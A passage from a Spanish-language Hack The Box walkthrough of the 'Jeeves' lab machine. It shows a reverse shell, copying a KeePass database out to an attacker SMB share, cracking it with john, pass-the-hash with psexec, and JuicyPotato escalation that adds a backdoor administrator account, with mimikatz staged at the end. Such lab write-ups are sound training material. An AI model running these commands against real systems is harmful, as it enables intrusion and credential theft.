<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.63,49678<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>JEEVES<span class="se">\k</span>ohsuke,JEEVES<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\k</span>ohsuke authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> kohsuke::JEEVES:aaaaaaaaaaaaaaaa:c23a012c38f0f7005de8ee2b9a5c45c4:010100000000000000f5b20e48add901859a5b91331600a700000000010010004c0058006f0072007a0078004c004b00030010004c0058006f0072007a0078004c004b00020010005a0042005700500078004c006c004400040010005a0042005700500078004c006c0044000700080000f5b20e48add90106000400020000000800300030000000000000000000000000300000ecd30e6e2741e888fe19c320d42d3424341eac95c921e6f32cf839ae34398fa60a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003200000000000000000000000000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:parrotsec<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ rlwrap nc <span class="nt">-lvnp</span> 443
Listening on 0.0.0.0 443
Connection received on 10.10.10.63 49679
Microsoft Windows <span class="o">[</span>Version 10.0.10586]
<span class="o">(</span>c<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\.</span>jenkins&gt;
</code></pre></div></div>

<h2 id="usertxt">User.txt</h2>

<ul>
  <li>Si nos vamos ala <strong>raiz</strong> <code class="language-plaintext highlighter-rouge">C:\</code> vemos que hay est√° la <code class="language-plaintext highlighter-rouge">user.txt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir</span> /r /s user.txt
 Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>esktop

11/03/2017  11:22 PM                32 user.txt
               1 File<span class="o">(</span>s<span class="o">)</span>             32 bytes

     Total Files Listed:
               1 File<span class="o">(</span>s<span class="o">)</span>             32 bytes
               0 Dir<span class="o">(</span>s<span class="o">)</span>   2,408,325,120 bytes free

C:<span class="se">\&gt;</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">type </span>user.txt
e3232272596fb47950d59c4cf1e7066a
C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>esktop&gt;
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>Si vamos un directorio hacia atr√°s vemos lo siguiente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments

11/03/2017  11:18 PM    &lt;DIR&gt;          <span class="nb">.</span>
11/03/2017  11:18 PM    &lt;DIR&gt;          ..
09/18/2017  01:43 PM             2,846 CEH.kdbx
               1 File<span class="o">(</span>s<span class="o">)</span>          2,846 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   2,408,325,120 bytes free

C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Esto corresponde al <code class="language-plaintext highlighter-rouge">KeePass</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web15.png" />
</p>

<ul>
  <li>Vamos a traernos eso a nuestra m√°quina de atacante usando el recurso compartido a nivel de red con <code class="language-plaintext highlighter-rouge">smbclient.py</code> que ya tenemos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy CEH.kdbx <span class="se">\\</span>10.10.14.12<span class="se">\p</span>arrotsec<span class="se">\C</span>EH.kdbx
        1 file<span class="o">(</span>s<span class="o">)</span> copied.

C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Y tenemos el archivo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">ls</span>
Ôíâ CEH.kdbx  ÔÖ∫ nc.exe
</code></pre></div></div>

<ul>
  <li>Vamos a abrirlo lo m√°s probable es que necesitemos una contrase√±a.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ keepassxc CEH.kdbx &amp; <span class="nb">disown</span>
<span class="o">[</span>1] 197209
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web16.png" />
</p>

<ul>
  <li>Como no sabemos la contrase√±a algo que podemos hacer es usar <code class="language-plaintext highlighter-rouge">keepass2john</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ keepass2john CEH.kdbx <span class="o">&gt;</span> <span class="nb">hash</span>
‚ùØ catn <span class="nb">hash
</span>CEH:<span class="nv">$keepass$*</span>2<span class="k">*</span>6000<span class="k">*</span>0<span class="k">*</span>1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d<span class="k">*</span>3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091<span class="k">*</span>393c97beafd8a820db9142a6a94f03f6<span class="k">*</span>b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff<span class="k">*</span>cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
</code></pre></div></div>

<ul>
  <li>Y bueno tenemos la contrase√±a.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>KeePass <span class="o">[</span>SHA256 AES 32/64]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 6000 <span class="k">for </span>all loaded hashes
Cost 2 <span class="o">(</span>version<span class="o">)</span> is 2 <span class="k">for </span>all loaded hashes
Cost 3 <span class="o">(</span>algorithm <span class="o">[</span><span class="nv">0</span><span class="o">=</span>AES, <span class="nv">1</span><span class="o">=</span>TwoFish, <span class="nv">2</span><span class="o">=</span>ChaCha]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
moonshine1       <span class="o">(</span>CEH<span class="o">)</span>
1g 0:00:01:27 DONE <span class="o">(</span>2023-07-02 19:14<span class="o">)</span> 0.01142g/s 628.1p/s 628.1c/s 628.1C/s mwuah..moonshine1
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</code></pre></div></div>

<ul>
  <li>Ahora podemos usar el <code class="language-plaintext highlighter-rouge">keepassxc</code> para poder abrir el archivo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web17.png" />
</p>

<ul>
  <li>Y bueno vemos varias cosas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web18.png" />
</p>

<ul>
  <li>
    <p>Si hacemos un <code class="language-plaintext highlighter-rouge">ctrl+c</code> vemos que nos copea esto <code class="language-plaintext highlighter-rouge">aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</code>.</p>
  </li>
  <li>
    <p>Y bueno eso es un <code class="language-plaintext highlighter-rouge">hash</code> que podemos usar para aplicar <code class="language-plaintext highlighter-rouge">passthehash</code>.</p>
  </li>
  <li>
    <p>Vamos a validarlo con <code class="language-plaintext highlighter-rouge">crackmapexec</code> si es el del usuario <strong>Administrator</strong>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ crackmapexec smb 10.10.10.63 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">':e0fb1fb85756c24235ff238cbe81fe00'</span>
SMB         10.10.10.63     445    JEEVES           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Pro 10586 x64 <span class="o">(</span>name:JEEVES<span class="o">)</span> <span class="o">(</span>domain:Jeeves<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.10.10.63     445    JEEVES           <span class="o">[</span>+] Jeeves<span class="se">\A</span>dministrator::e0fb1fb85756c24235ff238cbe81fe00 <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<h2 id="shell-as-administrator">Shell as Administrator</h2>

<ul>
  <li>Pues bueno podemos conectarnos con el <code class="language-plaintext highlighter-rouge">hash nt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ psexec.py WORKGROUP/Administrator@10.10.10.63 <span class="nt">-hashes</span> :e0fb1fb85756c24235ff238cbe81fe00
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.63.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file LBvnmiYK.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.63.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service QTka on 10.10.10.63.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service QTka.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.10586]
<span class="o">(</span>c<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="roottxt">Root.txt</h2>

<ul>
  <li>Nos dicen que la flag est√° en otro lado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop

11/08/2017  10:05 AM    &lt;DIR&gt;          <span class="nb">.</span>
11/08/2017  10:05 AM    &lt;DIR&gt;          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File<span class="o">(</span>s<span class="o">)</span>            833 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   2,407,817,216 bytes free

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>hm.txt
The flag is elsewhere.  Look deeper.
C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
</code></pre></div></div>

<ul>
  <li>Bueno vamos a hacer un <code class="language-plaintext highlighter-rouge">dir /r /s</code> que corresponden a <code class="language-plaintext highlighter-rouge">data streams</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web19.png" />
</p>

<ul>
  <li>Y all√≠ vemos la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">dir</span> /r /s
 Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop

11/08/2017  10:05 AM    &lt;DIR&gt;          <span class="nb">.</span>
11/08/2017  10:05 AM    &lt;DIR&gt;          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:<span class="nv">$DATA</span>
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File<span class="o">(</span>s<span class="o">)</span>            833 bytes

     Total Files Listed:
               2 File<span class="o">(</span>s<span class="o">)</span>            833 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   2,407,755,776 bytes free

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; more &lt; hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
</code></pre></div></div>

<h2 id="shell-as-root-second-way">Shell as root second way</h2>

<ul>
  <li>Si vemos los privilegios del usuario vemos que forma parte del grupo <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> podemos usar el <strong>JuicyPotato</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                               State
<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
SeTimeZonePrivilege           Change the <span class="nb">time </span>zone                      Disabled

C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>esktop&gt;
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/img.png" />
</p>

<ul>
  <li>
    <p>Aqu√≠ puedes encontrarlo <a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1">https://github.com/ohpe/juicy-potato/releases/tag/v0.1</a>.</p>
  </li>
  <li>
    <p>Vamos a pasarlo ala maquina victima pero en la ruta <code class="language-plaintext highlighter-rouge">C:\Windows\Temp</code> y nos vamos a crear una carpeta para almacenarlo hay.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>Prives

<span class="nb">cd </span>Prives
<span class="nb">cd </span>Prives

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy <span class="se">\\</span>10.10.14.12<span class="se">\p</span>arrotsec<span class="se">\J</span>uicyPotato.exe JuicyPotato.exe
        1 file<span class="o">(</span>s<span class="o">)</span> copied.

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives

07/03/2023  02:59 AM    &lt;DIR&gt;          <span class="nb">.</span>
07/03/2023  02:59 AM    &lt;DIR&gt;          ..
07/02/2023  09:50 PM           347,648 JuicyPotato.exe
               1 File<span class="o">(</span>s<span class="o">)</span>        347,648 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   2,407,399,424 bytes free

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
</code></pre></div></div>

<ul>
  <li>Vamos a agregar un nuevo usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c net user miguel miguel123</span><span class="nv">$!</span><span class="s2"> /add"</span> <span class="nt">-l</span> 1337
JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c net user miguel miguel123</span><span class="nv">$!</span><span class="s2"> /add"</span> <span class="nt">-l</span> 1337
Testing <span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span> 1337
......
<span class="o">[</span>+] authresult 0
<span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span><span class="p">;</span>NT AUTHORITY<span class="se">\S</span>YSTEM

<span class="o">[</span>+] CreateProcessWithTokenW OK

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user
net user

User accounts <span class="k">for</span> <span class="se">\\</span>JEEVES

<span class="nt">-------------------------------------------------------------------------------</span>
Administrator            DefaultAccount           Guest
kohsuke                  miguel
The <span class="nb">command </span>completed successfully.


C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
</code></pre></div></div>

<ul>
  <li>Si validamos vemos que es v√°lido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ crackmapexec smb 10.10.10.63 <span class="nt">-u</span> <span class="s1">'miguel'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!'</span>
SMB         10.10.10.63     445    JEEVES           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Pro 10586 x64 <span class="o">(</span>name:JEEVES<span class="o">)</span> <span class="o">(</span>domain:Jeeves<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.10.10.63     445    JEEVES           <span class="o">[</span>+] Jeeves<span class="se">\m</span>iguel:miguel123<span class="nv">$!</span>
</code></pre></div></div>

<ul>
  <li>Ahora tenemos que hacer que forme del grupo <strong>Administrators</strong> podemos hacerlo con <strong>JuicyPotato.exe</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c net localgroup Administrators miguel /add"</span> <span class="nt">-l</span> 1337
Testing <span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span> 1337
......
<span class="o">[</span>+] authresult 0
<span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span><span class="p">;</span>NT AUTHORITY<span class="se">\S</span>YSTEM

<span class="o">[</span>+] CreateProcessWithTokenW OK

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
</code></pre></div></div>

<ul>
  <li>Y bueno ahora formamos parte del grupo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user miguel
net user miguel
User name                    miguel
Full Name
Comment
User<span class="s1">'s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/3/2023 3:03:27 AM
Password expires             Never
Password changeable          7/3/2023 3:03:27 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.


C:\Windows\Temp\Prives&gt;
</span></code></pre></div></div>

<ul>
  <li>Antes de validar con <code class="language-plaintext highlighter-rouge">crackmapexec</code> debemos hacer lo siguiente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c reg add HKLM</span><span class="se">\S</span><span class="s2">oftware</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\C</span><span class="s2">urrentVersion</span><span class="se">\P</span><span class="s2">olicies</span><span class="se">\S</span><span class="s2">ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"</span> <span class="nt">-l</span> 1337
Testing <span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span> 1337
......
<span class="o">[</span>+] authresult 0
<span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span><span class="p">;</span>NT AUTHORITY<span class="se">\S</span>YSTEM

<span class="o">[</span>+] CreateProcessWithTokenW OK

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
</code></pre></div></div>

<ul>
  <li>Ahora validamos con <strong>crackmapexec</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ crackmapexec smb 10.10.10.63 <span class="nt">-u</span> <span class="s1">'miguel'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!'</span>
SMB         10.10.10.63     445    JEEVES           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Pro 10586 x64 <span class="o">(</span>name:JEEVES<span class="o">)</span> <span class="o">(</span>domain:Jeeves<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.10.10.63     445    JEEVES           <span class="o">[</span>+] Jeeves<span class="se">\m</span>iguel:miguel123<span class="nv">$!</span> <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora nos podemos conectar con la contrase√±a que proporcionamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ psexec.py WORKGROUP/miguel@10.10.10.63 cmd.exe
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.63.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file TjCVyPZu.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.63.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service ntnX on 10.10.10.63.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service ntnX.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.10586]
<span class="o">(</span>c<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="extra">Extra</h2>

<ul>
  <li>Algo que podemos hacer es subir el <code class="language-plaintext highlighter-rouge">mimikatz.exe</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/ok.png" />
</p>

<ul>
  <li><a href="https://github.com/gentilkiwi/mimikatz/releases/">https://github.com/gentilkiwi/mimikatz/releases/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ unzip mimikatz_trunk.zip
Archive:  mimikatz_trunk.zip
  inflating: kiwi_passwords.yar
  inflating: mimicom.idl
  inflating: README.md
   creating: Win32/
  inflating: Win32/mimidrv.sys
  inflating: Win32/mimikatz.exe
  inflating: Win32/mimilib.dll
  inflating: Win32/mimilove.exe
  inflating: Win32/mimispool.dll
   creating: x64/
  inflating: x64/mimidrv.sys
  inflating: x64/mimikatz.exe
  inflating: x64/mimilib.dll
  inflating: x64/mimispool.dll
‚ùØ <span class="nb">ls</span>
ÔÑï Win32  Ôíâ CEH.kdbx  ÔÖ∫ JuicyPotato.exe     ÔÄñ mimicom.idl         ÔÖ∫ nc.exe
ÔÑï x64    ÔÄñ <span class="nb">hash</span>      ÔÄñ kiwi_passwords.yar  Ôêê mimikatz_trunk.zip  Óòâ README.md
‚ùØ <span class="nb">cd </span>x64
‚ùØ <span class="nb">ls</span>
ÔÄñ mimidrv.sys  ÔÖ∫ mimikatz.exe  ÔÖ∫ mimilib.dll  ÔÖ∫ mimispool.dll
</code></pre></div></div>

<ul>
  <li>Ahora aprovech√°ndonos de nuestro recurso compartido que tenemos con <code class="language-plaintext highlighter-rouge">smbserver.py</code> vamos a subirlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ smbserver.py parrotsec <span class="nb">.</span> <span class="nt">-smb2support</span>
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.63,49676<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:parrotsec<span class="o">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ psexec.py WORKGROUP/Administrator@10.10.10.63 <span class="nt">-hashes</span> :e0fb1fb85756c24235ff238cbe81fe00
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

